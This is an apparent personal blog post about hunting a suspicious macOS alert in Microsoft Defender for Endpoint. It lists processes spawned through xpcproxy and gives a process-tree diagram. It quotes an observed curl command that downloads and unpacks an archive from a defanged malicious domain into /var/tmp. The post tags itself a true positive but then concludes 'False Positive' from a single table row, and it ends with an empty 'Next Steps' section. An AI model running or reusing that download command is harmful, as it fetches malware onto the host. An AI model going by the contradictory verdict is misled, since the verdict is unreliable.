---
title: Mac Malware?
date: 2022-05-19 11:39 +0200
categories: [Hunting, MDE]
tags: [mde, hunting, true positive]
---
{% include mermaid.liquid %}

Today we investigate some strange discovery actions by processes on a macbook

## The Alert
In the essence this alert was showing multiple different processes doing very similar discovery actions.
In most cases the process [xpcproxy](https://www.unix.com/man-page/osx/8/xpcproxy/) was used to run a sub process which in turn started some bash commands.
For this investigation I put xpcproxy out of scope as it did not seem to be part of a malicious execution chain (my mac knowledge is basic)
This xpcproxy would run an executable for example apadecoded and this in turn would run new processes example:
```bash
/bin/sh /var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/T/FE8B53AE-FE86-4FF8-98E1-D7987304368D
```
apadecoded itself looks already strange enough and is also found on VT, but what is this "FE8B53AE-FE86-4FF8-98E1-D7987304368D"?

For this I first needed to get into the investigation a bit closer and luckily MDE was reporting this cli events in the same incident:
```bash
/usr/bin/curl -s -L -o /var/tmp/helpexecd.tgz hxxp://cdn[.]eniqdix[.]icu/static/s3/exec6625/helpexecd[.]tgz
tar -xzf /var/tmp/helpexecd.tgz -C /var/tmp/helpexecd/
```
And this resultet in a new executable "/private/var/tmp/helpexecd/helpexecd"


## Hunting deeper

<div class="mermaid">
flowchart TD;
    kernel_task[kernel_task];
    launchd[launchd];
    bash1[bash];
    xpcproxy[xpcproxy];
    syncservice[syncservice];
    bash2[bash];
    sh[sh];
    canonistical[canonistical];
    noble[noble];
    odontolite[odontolite];
    intrinsicalness[intrinsicalness];
    TestDate[TestDate];
    SysUpdater[SysUpdater];
    leam[leam];
    recommitment[recommitment];
    TestDateDaemon[TestDateDaemon];
    apadecode[apadecode];
    apadecoded[apadecoded];

    kernel_task --> launchd;
    launchd --> bash1;
    bash1 --> syncservice;
    syncservice --> sh;
    sh --> bash2;
    xpcproxy --> canonistical;
    xpcproxy --> noble;
    xpcproxy --> odontolite;
    xpcproxy --> intrinsicalness;
    xpcproxy --> TestDate;
    xpcproxy --> SysUpdater;
    xpcproxy --> leam;
    xpcproxy --> recommitment;
    xpcproxy --> TestDateDaemon;
    xpcproxy --> apadecode;
    xpcproxy --> apadecoded;
</div>


## Verdict

| Indicator                              | Thoughts                                                                                                            | Verdict |
|----------------------------------------|---------------------------------------------------------------------------------------------------------------------|---------|
| CMD started by User                    | Either compromise of host, or legitimate action by user                                                             | -10%    |

**Verdict: False Positive**

## Next Steps

